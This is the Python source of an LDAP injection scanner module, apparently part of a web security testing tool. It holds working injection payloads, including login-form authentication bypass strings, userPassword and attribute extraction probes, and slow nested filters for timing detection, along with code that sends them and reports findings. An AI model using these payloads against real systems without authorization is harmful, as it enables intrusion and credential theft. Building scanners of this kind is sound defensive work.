"""
LDAP Injection Scanner — InsertionPoint per-parameter isolation (CWE-90).

Architecture:
  Phase 1: Error-based LDAP injection (15 error patterns, 10 payloads)
  Phase 2: Boolean-based blind LDAP (response differential)
  Phase 3: Auth bypass via login forms
  Phase 4: Timing-based blind LDAP (expensive filter evaluation)
  Phase 5: DN manipulation + attribute extraction
"""

import re
import time
from urllib.parse import urlparse, parse_qs

from secprobe.config import Severity
from secprobe.core.insertion_points import (
    InsertionPointDiscovery, InsertionType, send_request,
)
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


LDAP_ERROR_PATTERNS = [
    re.compile(r"LDAP\s*(?:error|exception|query|search)", re.IGNORECASE),
    re.compile(r"javax\.naming\.(?:directory|ldap)", re.IGNORECASE),
    re.compile(r"Invalid DN syntax", re.IGNORECASE),
    re.compile(r"Bad search filter", re.IGNORECASE),
    re.compile(r"unrecognized LDAP filter", re.IGNORECASE),
    re.compile(r"ldap_search|ldap_bind|ldap_connect", re.IGNORECASE),
    re.compile(r"Size limit exceeded", re.IGNORECASE),
    re.compile(r"No such object", re.IGNORECASE),
    re.compile(r"Operations error", re.IGNORECASE),
    re.compile(r"Net::LDAP", re.IGNORECASE),
    re.compile(r"LDAPException", re.IGNORECASE),
    re.compile(r"ldap_err2string", re.IGNORECASE),
    re.compile(r"Invalid LDAP filter", re.IGNORECASE),
    re.compile(r"LdapErr:", re.IGNORECASE),
    re.compile(r"AcceptSecurityContext", re.IGNORECASE),
]

LDAP_ERROR_PAYLOADS = [
    (")(cn=*))(|(cn=*", "Broken filter"),
    ("*)(uid=*))(|(uid=*", "Wildcard injection"),
    (")(|(password=*)", "Password filter leak"),
    ("\\00", "Null byte"),
    (")(cn=*))%00", "Null byte filter"),
    ("*)(|(objectClass=*))", "objectClass wildcard"),
    (")(department=*))(|(department=*", "Department filter"),
    ("*)(userPassword=*)", "Password attr leak"),
    (")(|(mail=*))", "Mail attr leak"),
    ("*)(cn=*)(|", "Unbalanced parentheses"),
]

LDAP_BOOLEAN_PAIRS = [
    ("*)(objectClass=*", "*)(objectClass=doesnotexist", "objectClass"),
    ("admin)(|(cn=*", "admin)(|(cn=doesnotexist", "cn wildcard"),
    ("*", "zzznonexistent999", "Wildcard vs impossible"),
    ("*)(sn=*", "*)(sn=zzznonexistent999", "surname wildcard"),
    ("*)(mail=*", "*)(mail=zzznonexistent999", "mail wildcard"),
]

LDAP_AUTH_BYPASS = [
    ("*", "*", "Wildcard credentials"),
    ("*)(|(&", "ignored", "Filter injection"),
    ("admin)(&)", "anything", "Admin bypass"),
    ("admin)(|(objectClass=*)", "anything", "objectClass bypass"),
    ("*)(uid=*))(|(uid=*", "pass", "Wildcard UID"),
    ("*)(&", "*", "Short-circuit"),
]

# Timing payloads — complex filter chains that are slow to evaluate
LDAP_TIMING_PAYLOADS = [
    ("*)(|(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)", "Nested OR chain"),
    ("*)(|(uid=*)(sn=*)(mail=*)(cn=*)(objectClass=*)(givenName=*)(title=*)(l=*)(st=*)(postalCode=*)", "Multi-attribute OR"),
    ("*)(cn=*a*b*c*d*e*f*g*h*i*j*k*l*m*n*o*p*q*r*s*t*u*v*w*x*y*z*", "Complex wildcard pattern"),
    ("*)(|(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)", "Deep nested OR"),
]

# DN manipulation payloads
DN_PAYLOADS = [
    (",cn=admin,dc=target,dc=com", "DN traversal", "dn_traversal"),
    (";cn=admin", "DN semicolon inject", "dn_semicolon"),
    ("/cn=admin", "DN slash inject", "dn_slash"),
    ("\\,cn=admin", "DN escaped comma", "dn_escaped"),
    (",ou=admins", "OU injection", "ou_inject"),
]

# Data-extraction attribute payloads
ATTRIBUTE_PAYLOADS = [
    ("*)(userPassword=*", "userPassword leak"),
    ("*)(telephoneNumber=*", "telephoneNumber leak"),
    ("*)(homeDirectory=*", "homeDirectory leak"),
    ("*)(loginShell=*", "loginShell leak"),
    ("*)(uidNumber=*", "uidNumber leak"),
    ("*)(gidNumber=*", "gidNumber leak"),
    ("*)(memberOf=*", "memberOf leak"),
]


class LDAPScanner(SmartScanner):
    name = "LDAP Scanner"
    description = "Test for LDAP Injection vulnerabilities (CWE-90)"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing LDAP injection on {url}", "progress")

        try:
            baseline = self.http_client.get(url)
        except Exception as e:
            self.result.error = str(e)
            return

        baseline_text = baseline.text
        found_vulns = set()

        # ── Discover insertion points ────────────────────────────────
        discovery = InsertionPointDiscovery(
            include_headers=False,
            include_cookies=True,
            include_paths=False,
        )
        points = discovery.discover(url, response=baseline)
        query_points = [p for p in points if p.type == InsertionType.QUERY_PARAM]

        if not query_points:
            for p in ["user", "username", "uid", "cn", "login", "search", "dn", "filter", "name"]:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}=test"
                pts = discovery.discover(test_url)
                query_points.extend(
                    pt for pt in pts
                    if pt.type == InsertionType.QUERY_PARAM and pt.name == p
                )

        # ── Phase 1: Error-based per-param ───────────────────────────
        self._test_error_based(query_points, baseline_text, found_vulns)

        # ── Phase 2: Boolean-based per-param ─────────────────────────
        self._test_boolean(query_points, baseline_text, found_vulns)

        # ── Phase 3: Auth bypass via forms ───────────────────────────
        forms = self.context.get_injectable_forms() if self.context else []
        self._test_auth_bypass(url, forms, found_vulns)

        # ── Phase 4: Timing-based blind LDAP ─────────────────────────
        self._test_timing_based(query_points, found_vulns)

        # ── Phase 5: DN manipulation + attribute extraction ──────────
        self._test_dn_manipulation(query_points, baseline_text, found_vulns)
        self._test_attribute_extraction(query_points, baseline_text, found_vulns)

        if not found_vulns:
            self.add_finding(
                title="No LDAP injection detected",
                severity=Severity.INFO,
                description="Automated tests did not detect LDAP injection.",
                category="LDAP Injection",
            )

    def _test_error_based(self, query_points, baseline_text, found_vulns):
        """Phase 1: Error-based LDAP injection — one param at a time."""
        print_status("Phase 1: Error-based LDAP injection", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for payload, desc in LDAP_ERROR_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                for pattern in LDAP_ERROR_PATTERNS:
                    if pattern.search(resp.text) and not pattern.search(baseline_text):
                        found_vulns.add((spec.url, point.name))
                        self.add_finding(
                            title=f"LDAP Injection (error-based) - {desc}",
                            severity=Severity.HIGH,
                            description=f"LDAP error via {point.display_name}: {pattern.pattern}",
                            recommendation="Use parameterised LDAP queries. Escape metacharacters.",
                            evidence=f"Point: {point.display_name}\nPayload: {payload}",
                            category="LDAP Injection", url=spec.url, cwe="CWE-90",
                        )
                        print_finding(Severity.HIGH, f"LDAP: {desc} on {point.name}")
                        break
                else:
                    continue
                break  # found vuln on this param, move to next

    def _test_boolean(self, query_points, baseline_text, found_vulns):
        """Phase 2: Boolean-based LDAP injection — one param at a time."""
        print_status("Phase 2: Boolean-based LDAP injection", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for true_p, false_p, desc in LDAP_BOOLEAN_PAIRS:
                true_spec = point.inject(true_p, mode="append")
                false_spec = point.inject(false_p, mode="append")
                try:
                    true_resp = send_request(self.http_client, true_spec, allow_redirects=False)
                    false_resp = send_request(self.http_client, false_spec, allow_redirects=False)
                except Exception:
                    continue

                size_diff = abs(len(true_resp.text) - len(false_resp.text))
                status_diff = true_resp.status_code != false_resp.status_code
                if size_diff > 100 or (size_diff > 50 and status_diff):
                    found_vulns.add((true_spec.url, point.name))
                    self.add_finding(
                        title=f"LDAP Injection (boolean) via '{point.name}' - {desc}",
                        severity=Severity.HIGH,
                        description=f"Boolean LDAP condition changes response via {point.display_name}.",
                        recommendation="Use parameterised LDAP queries.",
                        evidence=(
                            f"True: {len(true_resp.text)}B ({true_resp.status_code}), "
                            f"False: {len(false_resp.text)}B ({false_resp.status_code})"
                        ),
                        category="LDAP Injection", url=true_spec.url, cwe="CWE-90",
                    )
                    break

    def _test_auth_bypass(self, url, forms, found_vulns):
        """Phase 3: Auth bypass via forms."""
        print_status("Phase 3: LDAP auth bypass", "progress")

        for form in forms:
            action = form.get("action", url)
            fields = form.get("fields", {})
            user_field = next(
                (f for f in fields if any(k in f.lower() for k in ["user", "login", "uid", "cn"])),
                None,
            )
            pass_field = next(
                (f for f in fields if any(k in f.lower() for k in ["pass", "pwd", "secret"])),
                None,
            )
            if not user_field:
                continue

            for user_val, pass_val, desc in LDAP_AUTH_BYPASS:
                post_data = dict(fields)
                post_data[user_field] = user_val
                if pass_field:
                    post_data[pass_field] = pass_val
                try:
                    resp = self.http_client.post(action, data=post_data, allow_redirects=False)
                    if resp.status_code in (200, 301, 302) and "error" not in resp.text.lower()[:500]:
                        if any(kw in resp.text.lower() for kw in ["welcome", "dashboard"]) or resp.status_code in (301, 302):
                            found_vulns.add((action, user_field))
                            self.add_finding(
                                title=f"LDAP Auth Bypass - {desc}",
                                severity=Severity.CRITICAL,
                                description=f"LDAP auth bypass on '{user_field}' via filter injection.",
                                recommendation="Escape LDAP special characters in user input.",
                                evidence=f"URL: {action}\nUser: {user_val}",
                                category="LDAP Injection", url=action, cwe="CWE-90",
                            )
                            break
                except Exception:
                    continue

    def _test_timing_based(self, query_points, found_vulns):
        """Phase 4: Timing-based blind LDAP — expensive filter evaluation."""
        print_status("Phase 4: Timing-based blind LDAP injection", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            # Establish baseline timing (3 measurements)
            base_times = []
            for _ in range(3):
                spec = point.inject("test", mode="replace")
                try:
                    t0 = time.time()
                    send_request(self.http_client, spec, allow_redirects=False)
                    base_times.append(time.time() - t0)
                except Exception:
                    base_times.append(0)
            avg_base = sum(base_times) / len(base_times) if base_times else 0

            for payload, desc in LDAP_TIMING_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    t0 = time.time()
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                    elapsed = time.time() - t0
                except Exception:
                    continue

                # If response is >3x baseline and at least 2 seconds slower
                if elapsed > avg_base * 3 and elapsed - avg_base > 2.0:
                    # Verify with a second measurement
                    try:
                        t0 = time.time()
                        send_request(self.http_client, spec, allow_redirects=False)
                        elapsed2 = time.time() - t0
                    except Exception:
                        continue

                    if elapsed2 > avg_base * 2.5 and elapsed2 - avg_base > 1.5:
                        found_vulns.add((spec.url, point.name))
                        self.add_finding(
                            title=f"LDAP Injection (timing) via '{point.name}' - {desc}",
                            severity=Severity.HIGH,
                            description=(
                                f"Timing-based blind LDAP injection on {point.display_name}.\n"
                                f"Expensive LDAP filter causes measurable delay."
                            ),
                            recommendation="Use parameterised LDAP queries. Limit filter complexity.",
                            evidence=(
                                f"Baseline: {avg_base:.2f}s, "
                                f"Injected: {elapsed:.2f}s / {elapsed2:.2f}s"
                            ),
                            category="LDAP Injection", url=spec.url, cwe="CWE-90",
                        )
                        print_finding(Severity.HIGH, f"LDAP timing: {desc} on {point.name}")
                        break

    def _test_dn_manipulation(self, query_points, baseline_text, found_vulns):
        """Phase 5a: DN manipulation — inject into distinguished names."""
        print_status("Phase 5: DN manipulation", "progress")

        dn_params = [p for p in query_points
                      if any(kw in p.name.lower() for kw in ["dn", "ou", "cn", "dc", "base", "path"])]

        for point in dn_params:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for payload, desc, _ in DN_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                # Check for LDAP errors indicating DN was parsed
                for pattern in LDAP_ERROR_PATTERNS:
                    if pattern.search(resp.text) and not pattern.search(baseline_text):
                        found_vulns.add((spec.url, point.name))
                        self.add_finding(
                            title=f"LDAP DN Manipulation — {desc}",
                            severity=Severity.HIGH,
                            description=(
                                f"DN injection via {point.display_name}.\n"
                                f"The server processes injected DN components."
                            ),
                            recommendation="Escape DN special characters (RFC 4514).",
                            evidence=f"Point: {point.display_name}\nPayload: {payload}",
                            category="LDAP Injection", url=spec.url, cwe="CWE-90",
                        )
                        break
                else:
                    # Check for different content (may have traversed to different OU)
                    size_diff = abs(len(resp.text) - len(baseline_text))
                    if size_diff > 200 and resp.status_code == 200:
                        found_vulns.add((spec.url, point.name))
                        self.add_finding(
                            title=f"LDAP DN Traversal — {desc}",
                            severity=Severity.HIGH,
                            description=(
                                f"DN traversal via {point.display_name} changes "
                                f"response significantly ({size_diff}B difference)."
                            ),
                            recommendation="Validate DN components against an allowlist.",
                            evidence=f"Point: {point.display_name}\nSize diff: {size_diff}B",
                            category="LDAP Injection", url=spec.url, cwe="CWE-90",
                        )
                        break

    def _test_attribute_extraction(self, query_points, baseline_text, found_vulns):
        """Phase 5b: Attribute extraction — leak sensitive LDAP attributes."""
        print_status("Phase 5b: LDAP attribute extraction", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for payload, desc in ATTRIBUTE_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                # If wildcard attribute filter returns more data than baseline
                if len(resp.text) > len(baseline_text) + 100 and resp.status_code == 200:
                    # Verify it's not just noise
                    spec2 = point.inject("*)(zzz_nonexistent=*", mode="append")
                    try:
                        resp2 = send_request(self.http_client, spec2, allow_redirects=False)
                    except Exception:
                        continue

                    if len(resp.text) > len(resp2.text) + 50:
                        found_vulns.add((spec.url, point.name))
                        self.add_finding(
                            title=f"LDAP Attribute Leak — {desc}",
                            severity=Severity.HIGH,
                            description=(
                                f"LDAP filter injection via {point.display_name} "
                                f"leaks additional attribute data."
                            ),
                            recommendation="Use parameterised LDAP queries with explicit attribute lists.",
                            evidence=(
                                f"Point: {point.display_name}\n"
                                f"Baseline: {len(baseline_text)}B, "
                                f"Injected: {len(resp.text)}B, "
                                f"Control: {len(resp2.text)}B"
                            ),
                            category="LDAP Injection", url=spec.url, cwe="CWE-90",
                        )
                        break
